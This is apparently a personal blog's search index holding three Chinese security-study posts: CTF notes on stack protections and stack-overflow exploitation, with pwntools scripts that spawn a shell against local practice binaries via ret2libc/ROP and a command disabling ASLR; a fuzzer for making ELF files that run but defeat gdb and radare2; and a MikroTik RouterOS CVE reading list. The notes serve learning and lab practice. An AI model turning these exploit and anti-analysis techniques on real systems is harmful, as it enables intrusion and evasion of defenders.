<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>零零散散</title>
      <link href="/2020/03/29/%E9%9B%B6%E9%9B%B6%E6%95%A3%E6%95%A3/"/>
      <url>/2020/03/29/%E9%9B%B6%E9%9B%B6%E6%95%A3%E6%95%A3/</url>
      
        <content type="html"><![CDATA[<p>整理了下电脑，不知道什么时候零零散散的记录了这些东西，也舍不得删掉，就放到这记录记录吧</p><h2 id="零零"><a href="#零零" class="headerlink" title="零零"></a>零零</h2><h3 id="堆栈保护"><a href="#堆栈保护" class="headerlink" title="堆栈保护"></a>堆栈保护</h3><ol><li><p>关闭NX：代表着IP寄存器可以指向堆，栈了；</p></li><li><p>关闭PIE：代表着BSS段的地址是固定的，则可把shellcode写入bss段；</p></li><li><p>Stack:  如果开启的话会在栈中返回地址前放一个随机值，如果被覆盖，程序会报错；</p></li><li><p>ASLR：这个保护措施是由系统管理的，开启时，堆，栈与libc的地址会随机化。通过修改/proc/sys/kernel/randomize_va_space来控制ASLR启动与否，具体的选项有；</p><ul><li><p>关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同；</p></li><li><p>普通的 ASLR。栈基地址、mmap基地址、.so加载基地址都将被随机化，但是堆基地址没有随机化；</p></li><li><p>增强的ASLR，在 1 的基础上，增加了堆基地址随机化；</p><p>可以使用echo 0 &gt; /proc/sys/kernel/randomize_va_space关闭 Linux 系统的 ASLR</p></li></ul></li></ol><h3 id="栈溢出中比较重要的几个步骤"><a href="#栈溢出中比较重要的几个步骤" class="headerlink" title="栈溢出中比较重要的几个步骤"></a>栈溢出中比较重要的几个步骤</h3><ol><li>寻找危险函数，确定栈溢出的位置；</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：gets(),直接读取一行，忽略<span class="string">'\x00'</span></span><br><span class="line">     scanf() vscanf()</span><br><span class="line">输出：sprintf()</span><br><span class="line">字符串：strcpy(),字符串复制，遇到<span class="string">'\x00'</span>停止</span><br><span class="line"> strcat(),字符串拼接，遇到<span class="string">'\x00'</span>停止</span><br><span class="line"> bcopy（）</span><br></pre></td></tr></table></figure><ol start="2"><li><p>确定填充长度；<br>这一部分主要是计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p><p> 1.相对于栈基地址的的索引，可以直接通过查看EBP相对偏移获得<br> 2.相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。<br> 3.直接地址索引，就相当于直接给定了地址。<br> 一般来说，我们会有如下的覆盖需求<br> 1.覆盖函数返回地址，这时候就是直接看 EBP 即可。<br> 2.覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。<br> 3.覆盖 bss 段某个变量的内容。<br> 4.根据现实执行情况，覆盖特定的变量或地址的内容。<br> 之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。</p></li></ol><p>Demo:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vulnerable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+4h] [bp-14h]@1</span></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的栈布局如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure><p>对应的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">'./stack_example'</span>)</span><br><span class="line">success_addr = <span class="number">0x0804843b</span></span><br><span class="line"><span class="comment">#构造payload</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x14</span> + <span class="string">'bbbb'</span> + p32(success_addr)</span><br><span class="line"><span class="keyword">print</span> p32(success_addr)</span><br><span class="line"><span class="comment">#向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="comment">#`python -c 'print "A"*32+"\x90\x85\x04\x08"'`</span></span><br></pre></td></tr></table></figure><h3 id="栈溢出的利用"><a href="#栈溢出的利用" class="headerlink" title="栈溢出的利用"></a>栈溢出的利用</h3><ol><li><p>ret2text<code>(</code>ret2text`即控制程序执行程序本身已有的的代码(.text))</p></li><li><p>ret2shellcode</p><pre><code>ret2shellcode，即控制程序执行shellcod代码shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。在栈溢出的基础上，要想执行shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</code></pre></li><li><p>ret2syscall</p></li><li><p>ret2libc</p><p>下面demo来自b站君莫笑师傅</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">checksec ./ret2lib2</span><br><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br><span class="line">exp的构造：</span><br><span class="line">cyclic 200</span><br><span class="line"><span class="variable">$cyclic</span> -l 0x62616164</span><br><span class="line">112</span><br><span class="line">//The starting of exp</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">p = process(<span class="string">'./ret2libc2'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ret2libc2'</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'a'</span>*112 + p32(elf.plt[<span class="string">'gets'</span>])+<span class="string">'aaaa'</span>+ p32(elf.bss()+0x100)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; search <span class="string">"/bin/sh"</span></span><br><span class="line">libc-2.23.so    0xf7f56a0b das     /* <span class="string">'/bin/sh'</span> */</span><br><span class="line">只有这个，而libc的地址是随机的，实际运行的时候并不是这个地址，现在该怎么办？</span><br><span class="line">gets(&amp;s)</span><br><span class="line">自己可构造调用gets把/bin/sh读入到固定地址，再传给system即可</span><br><span class="line">一般来说在程序运行的时候bss段会分配很大一段空间，所以即可随便指定一个位置</span><br><span class="line">但是这里有个问题，我们想的执行了gets函数，再执行system函数，这里的aaaa就是返回地址，怎么执行到system去呢？</span><br><span class="line"></span><br><span class="line">ROP技术：</span><br><span class="line">如果程序中存在pop eax;ret,地址为100，我们用100替换掉aaaa,程序执行完gets之后就回执行pop eax；ret</span><br><span class="line">p.sendline(<span class="string">'a'</span>*112 + p32(elf.plt[<span class="string">'gets'</span>])+<span class="string">'aaaa'</span>+ p32(elf.bss()+0x100)+ <span class="string">'bbbb'</span></span><br><span class="line">就会去执行bbbb</span><br><span class="line">这就是rop技术，而pop eax;ret,这种以ret结尾的代码就被称为gadget，寻找gadget可以用ROPgadget首度寻找，也可使用pwntools提供的模块自动搜索</span><br><span class="line">使用pwntools自动寻找</span><br><span class="line">p.sendline(<span class="string">'a'</span>*112 + p32(elf.plt[<span class="string">'gets'</span>])+p32(rop.search(8).address)+ p32(elf.bss()+0x100)+p32(elf.plt[<span class="string">'system'</span>])+<span class="string">'aaaa'</span>+p32(elf.bss()+0x100))</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.intetactive()</span><br></pre></td></tr></table></figure></li></ol><h2 id="散散"><a href="#散散" class="headerlink" title="散散"></a>散散</h2><p>程序源代码被编译以后只要分为两种段：程序指令与程序数据，代码段属于程序指令，而数据段和.bss段都属于程序数据<br>.text<br>.data   存放初始化的全局变量与局部静态变量<br>.bss    存放未初始化的全局变量与局部静态变量<br>.rodata 只读数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span> <span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span>; <span class="comment">// a function to call</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">demo_stackframe</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">64</span>];</span><br><span class="line"><span class="keyword">int</span> y;</span><br><span class="line"><span class="keyword">int</span> z;</span><br><span class="line"><span class="comment">//body of function not terribly relevant other than</span></span><br><span class="line">bar(z,y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>//函数的栈帧（基于EBP的栈帧）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">变量           偏移量</span><br><span class="line"></span><br><span class="line">  z           [ebp-76]</span><br><span class="line">  y            [ebp-72]</span><br><span class="line">buffer         [ebp-68]</span><br><span class="line">  x            [ebp-4]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">save ebp        [ebp]</span><br><span class="line">save eip        [ebp+4]</span><br><span class="line">   a            [ebp+8]</span><br><span class="line">   b            [ebp+12]</span><br><span class="line">   c            [ebp+16]</span><br></pre></td></tr></table></figure><p>//相对于ebp寄存器 //恢复栈帧 “尾声”代码；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     esp, ebp</span><br><span class="line">pop     ebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>//由于这项操作十分常见，因此，x86体系结构提供了leave指令，以完成这个任务。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">define byte      </span><br><span class="line"></span><br><span class="line">db:定义一个存储字节  1字节</span><br><span class="line">dw:定义两个存储字节，也叫做字 2字节</span><br><span class="line">dd:定义4个存储字节，也叫双字 4字节</span><br><span class="line"></span><br><span class="line"> s r </span><br><span class="line"> r:IDA表示被保存的返回地址</span><br><span class="line"> s:被保存的寄存器值</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf/pwn/program </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn by @LiveOverFlow</title>
      <link href="/2020/03/27/pwn-by-LiveOverFlow/"/>
      <url>/2020/03/27/pwn-by-LiveOverFlow/</url>
      
        <content type="html"><![CDATA[<p>关于<code>@liveoverflow</code>的<code>pwn</code>部分的视频总结，也当作是记录下来，以便翻阅。</p><h2 id="Fuzzing-the-ELF-binary-to-find-parser-differential"><a href="#Fuzzing-the-ELF-binary-to-find-parser-differential" class="headerlink" title="Fuzzing the ELF binary to find parser differential"></a>Fuzzing the ELF binary to find parser differential</h2><h3 id="关于调试"><a href="#关于调试" class="headerlink" title="关于调试"></a>关于调试</h3><p><code>gdb</code> 与 <code>radare</code>必须解析可执行文件才能进行反汇编与调试，若修改可执行文件，格式被损坏，则该程序则不能运行，且<code>gdb</code>与<code>radare</code>不能进行解析调试。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gdb ./program</span><br><span class="line">$ radare2 ./program</span><br></pre></td></tr></table></figure><p>那么是否存在能以某种方式修改可执行文件，仍然可以在<code>Linux</code>中执行。即如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./program_1</span><br><span class="line">hacker</span><br><span class="line">$ gdb ./program</span><br><span class="line">ERROR. Can<span class="string">'t read binary</span></span><br><span class="line"><span class="string">$ radare2 ./program</span></span><br><span class="line"><span class="string">Parser Error. Fail...</span></span><br></pre></td></tr></table></figure><h3 id="Parser-Differential-Attack"><a href="#Parser-Differential-Attack" class="headerlink" title="Parser Differential Attack"></a>Parser Differential Attack</h3><p>对于不同的解析器而言，不同的解析器实现的解析算法都有些不同，若将输入搞错了，<code>Linux</code>可能会看到一个有效文件并执行该文件且正常执行，而gdb显示该文件已损坏，下面来看<code>fuzz the ELF binary</code> 的一个<code>Demo</code></p><p><code>license_2.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc==<span class="number">2</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Checking License: %s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(argv[<span class="number">1</span>]); i++) &#123;</span><br><span class="line">sum+= (<span class="keyword">int</span>)argv[<span class="number">1</span>][i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(sum==<span class="number">916</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Access Granted!\n"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"WRONG!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Usage: &lt;key&gt;\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>fuzz the ELF binary</code>来实现上述，当看到<code>fuzz</code>结果中不存在汇编程序时即可。</p><img src="/2020/03/27/pwn-by-LiveOverFlow/a.png" class="" title="This is an example image"><p><code>fuzz.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">"cp license_2 license_2_fuzz"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flip_byte</span><span class="params">(in_bytes)</span>:</span></span><br><span class="line">i = random.randint(<span class="number">0</span>,len(in_bytes))</span><br><span class="line">c = chr(random.randint(<span class="number">0</span>,<span class="number">0xFF</span>))</span><br><span class="line"><span class="keyword">return</span> in_bytes[:i]+c+in_bytes[i+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copy_binary</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"license_2"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> orig_f, open(<span class="string">"license_2_fuzz"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> new_f:</span><br><span class="line">new_f.write(flip_byte(orig_f.read()))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compare</span><span class="params">(fn1, fn2)</span>:</span></span><br><span class="line"><span class="keyword">with</span> open(fn1) <span class="keyword">as</span> f1, open(fn2) <span class="keyword">as</span> f2:</span><br><span class="line"><span class="keyword">return</span> f1.read()==f2.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_output</span><span class="params">()</span>:</span></span><br><span class="line">os.system(<span class="string">"(./license_2_fuzz ; ./license_2_fuzz AAAA-Z10N-42-OK) &gt; fuzz_output"</span>)</span><br><span class="line"><span class="keyword">return</span> compare(<span class="string">"orig_output"</span>, <span class="string">"fuzz_output"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_gdb</span><span class="params">()</span>:</span></span><br><span class="line">os.system(<span class="string">"echo disassemble main | gdb license_2_fuzz &gt; fuzz_gdb"</span>)</span><br><span class="line"><span class="keyword">return</span> compare(<span class="string">"orig_gdb"</span>, <span class="string">"fuzz_gdb"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_radare</span><span class="params">()</span>:</span></span><br><span class="line">os.system(<span class="string">'echo -e "aaa\ns sym.main\npdf" | radare2 license_2_fuzz &gt; fuzz_radare'</span>)</span><br><span class="line"><span class="keyword">return</span> compare(<span class="string">"orig_radare"</span>, <span class="string">"fuzz_radare"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">copy_binary()</span><br><span class="line"><span class="keyword">if</span> check_output() <span class="keyword">and</span> <span class="keyword">not</span> check_gdb() <span class="keyword">and</span> <span class="keyword">not</span> check_radare():</span><br><span class="line"><span class="keyword">print</span> <span class="string">"FOUND POSSIBLE FAIL\n\n\n"</span></span><br><span class="line">os.system(<span class="string">"tail fuzz_gdb"</span>)</span><br><span class="line">os.system(<span class="string">"tail fuzz_radare"</span>)</span><br><span class="line">raw_input()</span><br></pre></td></tr></table></figure><p>最后运行生产的<code>license_2_fuzz</code>，可正常运行，但<code>gdb</code>与<code>radare</code>不能调试。</p><img src="/2020/03/27/pwn-by-LiveOverFlow/b.png" class="" title="This is an example image"><img src="/2020/03/27/pwn-by-LiveOverFlow/c.png" class="" title="This is an example image"><p>参考资料：</p><ol><li><a href="https://www.sentinelone.com/blog/breaking-and-evading" target="_blank" rel="noopener">https://www.sentinelone.com/blog/breaking-and-evading</a></li><li><a href="https://ioactive.com/exploits-curdled-milk-and-nukes-oh-my/" target="_blank" rel="noopener">https://ioactive.com/exploits-curdled-milk-and-nukes-oh-my/</a></li><li><a href="https://openwall.info/wiki/people/solar/pocorgtfo" target="_blank" rel="noopener">International Journal of PoC || GTFO issues</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MikroTik RouterOS漏洞分析相关材料</title>
      <link href="/2020/03/26/MikroTik-RouterOS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%9B%B8%E5%85%B3%E6%9D%90%E6%96%99/"/>
      <url>/2020/03/26/MikroTik-RouterOS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%9B%B8%E5%85%B3%E6%9D%90%E6%96%99/</url>
      
        <content type="html"><![CDATA[<h2 id="MikroTik-RouterOS漏洞分析相关材料整理，以便方便查阅"><a href="#MikroTik-RouterOS漏洞分析相关材料整理，以便方便查阅" class="headerlink" title="MikroTik RouterOS漏洞分析相关材料整理，以便方便查阅"></a>MikroTik RouterOS漏洞分析相关材料整理，以便方便查阅</h2><h3 id="漏洞复现环境搭建"><a href="#漏洞复现环境搭建" class="headerlink" title="漏洞复现环境搭建"></a>漏洞复现环境搭建</h3><ol><li><a href="https://4hou.win/wordpress/?p=19279" target="_blank" rel="noopener">https://4hou.win/wordpress/?p=19279</a></li><li><a href="https://xz.aliyun.com/t/1907" target="_blank" rel="noopener">https://xz.aliyun.com/t/1907</a></li><li><a href="https://www.chenghuajie.cn/1351.html" target="_blank" rel="noopener">https://www.chenghuajie.cn/1351.html</a></li><li><a href="https://mikrotik.com/download/archive" target="_blank" rel="noopener">https://mikrotik.com/download/archive</a></li><li><a href="https://blog.csdn.net/qq_41453285/article/details/102152428" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/102152428</a></li><li><a href="https://medium.com/tenable-techblog/make-it-rain-with-mikrotik-c90705459bc6" target="_blank" rel="noopener">https://medium.com/tenable-techblog/make-it-rain-with-mikrotik-c90705459bc6</a></li><li><a href="https://medium.com/@maxi./finding-and-exploiting-cve-2018-7445-f3103f163cc1" target="_blank" rel="noopener">https://medium.com/@maxi./finding-and-exploiting-cve-2018-7445-f3103f163cc1</a></li></ol><h3 id="漏洞复现细节"><a href="#漏洞复现细节" class="headerlink" title="漏洞复现细节"></a>漏洞复现细节</h3><ol><li>CVE-2018-14847 MikroTik RouterOS Winbox arbitrary file read<ul><li><a href="http://wp.blkstone.me/2019/09/cve-2018-14847-mikrotik-routeros-winbox-arbitrary-file-read/" target="_blank" rel="noopener">http://wp.blkstone.me/2019/09/cve-2018-14847-mikrotik-routeros-winbox-arbitrary-file-read/</a></li><li><a href="https://github.com/BasuCert/WinboxPoC" target="_blank" rel="noopener">https://github.com/BasuCert/WinboxPoC</a></li><li><a href="https://www.anquanke.com/post/id/162457#h3-10" target="_blank" rel="noopener">https://www.anquanke.com/post/id/162457#h3-10</a></li></ul></li><li>Dissection of winbox Winbox critical vulnerability<ul><li><a href="https://blog.n0p.me/2018/05/2018-05-21-winbox-bug-dissection/" target="_blank" rel="noopener">https://blog.n0p.me/2018/05/2018-05-21-winbox-bug-dissection/</a></li></ul></li><li>CVE-2018-7445 MikroTik RouterOS SMB 缓冲区溢出<ul><li><a href="https://4hou.win/wordpress/?p=19279" target="_blank" rel="noopener">https://4hou.win/wordpress/?p=19279</a></li></ul></li><li><a href="https://kirils.org/slides/2017-09-15_prez_15_MT_Balccon_pub.pdf" target="_blank" rel="noopener">https://kirils.org/slides/2017-09-15_prez_15_MT_Balccon_pub.pdf</a></li><li>CVE-2018-1158 MikroTik RouterOS漏洞分析之发现CVE-2019-13955<ul><li><a href="https://www.anquanke.com/post/id/183451" target="_blank" rel="noopener">https://www.anquanke.com/post/id/183451</a></li></ul></li><li>Tenable Research的专家在DerbyCon上发表了题为“Bug Hunting in RouterOS”的演讲，介绍了这项新技术，就是利用该漏洞。目前结合该漏洞的黑客工具已放出，运行RouterOS的MikroTik设备成为恶意代码的目标。<ul><li><a href="https://github.com/tenable/routeros" target="_blank" rel="noopener">https://github.com/tenable/routeros</a></li><li><a href="https://github.com/tenable/routeros/blob/master/slides/bug_hunting_in_routeros_derbycon_2018.pdf" target="_blank" rel="noopener">https://github.com/tenable/routeros/blob/master/slides/bug_hunting_in_routeros_derbycon_2018.pdf</a></li></ul></li><li>通过对比 RouterOS 6.40.7 与 6.40.8 的 npk 文件来逆向工程漏洞细节的过程<ul><li><a href="http://ith4cker.com/content/uploadfile/201811/aed91542039274.pdf" target="_blank" rel="noopener">http://ith4cker.com/content/uploadfile/201811/aed91542039274.pdf</a></li></ul></li><li>Mikrotik-RouterOS-Resource-Stack-Exhaustion<ul><li><a href="https://packetstormsecurity.com/files/153733/Mikrotik-RouterOS-Resource-Stack-Exhaustion.html" target="_blank" rel="noopener">https://packetstormsecurity.com/files/153733/Mikrotik-RouterOS-Resource-Stack-Exhaustion.html</a></li></ul></li></ol><h3 id="Fuzz-Mikrotik-RouterOS"><a href="#Fuzz-Mikrotik-RouterOS" class="headerlink" title="Fuzz Mikrotik RouterOS"></a>Fuzz Mikrotik RouterOS</h3><ol><li>从0到Reverseshell：Mikrotik SMB漏洞实战（CVE-2018–7445）<ul><li><a href="https://bbs.pediy.com/thread-250733.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-250733.htm</a></li></ul></li></ol><h3 id="Mikrotik-RouterOS-安全事件"><a href="#Mikrotik-RouterOS-安全事件" class="headerlink" title="Mikrotik RouterOS 安全事件"></a>Mikrotik RouterOS 安全事件</h3><ol><li>基于 CVE-2018-14847 的 Mikrotik RouterOS 安全事件分析 <ul><li><a href="http://ith4cker.com/content/uploadfile/201811/aed91542039274.pdf" target="_blank" rel="noopener">http://ith4cker.com/content/uploadfile/201811/aed91542039274.pdf</a></li></ul></li><li>一些具体攻击案例，值得关注的是该文章中统计攻击者的具体方式<ul><li><a href="https://blog.netlab.360.com/7500-mikrotik-routers-are-forwarding-owners-traffic-to-the-attackers-how-is-yours/" target="_blank" rel="noopener">https://blog.netlab.360.com/7500-mikrotik-routers-are-forwarding-owners-traffic-to-the-attackers-how-is-yours/</a></li></ul></li></ol><h3 id="RouterOS-常见操作"><a href="#RouterOS-常见操作" class="headerlink" title="RouterOS 常见操作"></a>RouterOS 常见操作</h3><ol><li><a href="https://www.cnblogs.com/zoulongbin/p/5887746.html" target="_blank" rel="noopener">RouterOS 软路由常用命令</a></li><li><a href="https://blog.csdn.net/zhengfeng2100/article/details/9614515" target="_blank" rel="noopener">RouterOS 命令行操作</a></li></ol><h3 id="MikroTik-版本更新changelogs"><a href="#MikroTik-版本更新changelogs" class="headerlink" title="MikroTik 版本更新changelogs"></a>MikroTik 版本更新changelogs</h3><ol><li><a href="https://mikrotik.com/download/changelogs/long-term-release-tree" target="_blank" rel="noopener">https://mikrotik.com/download/changelogs/long-term-release-tree</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Router </tag>
            
        </tags>
      
    </entry>
    
    
    
